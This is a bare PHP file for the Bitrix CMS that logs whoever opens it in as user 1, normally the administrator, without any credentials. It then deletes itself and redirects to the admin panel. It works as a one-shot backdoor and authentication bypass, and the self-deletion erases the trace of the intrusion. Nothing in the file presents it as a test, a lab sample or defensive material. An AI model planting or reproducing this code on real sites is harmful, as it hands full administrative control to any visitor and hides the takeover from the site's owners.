<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");
global $USER;
$USER->Authorize(1);
@unlink(__FILE__);
LocalRedirect("/bitrix/admin/");
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>